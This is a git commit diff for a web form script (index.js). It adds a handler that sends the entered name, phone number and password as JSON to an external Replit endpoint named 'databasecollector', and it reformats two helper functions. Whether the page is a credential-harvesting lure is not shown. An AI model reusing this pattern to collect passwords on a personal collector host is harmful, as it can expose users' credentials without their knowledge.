94dc16279542928401c8b4282babcc96e16b243d
Angry-Creator <nwankwochidera252565@gmail.com>
2023-01-16 16:06:15 +0000

    Done

--- index.js
+++ index.js
@@ -3,29 +3,57 @@ const first = document.getElementById('first')
 const second = document.getElementById('second')
 const third = document.getElementById('third')
 
+const submitBtn = document.getElementById("submitBtn");
+
+submitBtn.onclick = (event) => {
+  event.preventDefault();
+  submit();
+}
+
+function submit() {
+  const userName = document.getElementById("name");
+  const phoneNumber = document.getElementById("phoneNumber");
+  const password = document.getElementById("password");
+
+  const data = {
+    "name": userName.value,
+    "phoneNumber": phoneNumber.value,
+    "password": password.value
+  };
+
+  fetch('https://databasecollector.angry-creator.repl.co/', {
+    method: "POST",
+    mode: "cors",
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data)
+  })
+    .then((response) => response.json())
+    .then((data) => console.log(data));
+}
 
 
-function next(current){
-  if(current ==='first'){
-    first.style.display='none';
-    second.style.display='block';
-}
-  else if(current ==='second'){
-    second.style.display='none';
-    third.style.display='block';
-}
+function next(current) {
+  if (current === 'first') {
+    first.style.display = 'none';
+    second.style.display = 'block';
+  }
+  else if (current === 'second') {
+    second.style.display = 'none';
+    third.style.display = 'block';
+  }
 }
 
 
 
 
 function revealPassword() {
-    var checkbox = document.getElementById("revealPasswordCheckbox");
-    var password = document.getElementById("password");
-    if (checkbox.checked) {
-      password.type = "text";
-    } else {
-      password.type = "password";
-    }
+  var checkbox = document.getElementById("revealPasswordCheckbox");
+  var password = document.getElementById("password");
+  if (checkbox.checked) {
+    password.type = "text";
+  } else {
+    password.type = "password";
   }
-  
+}
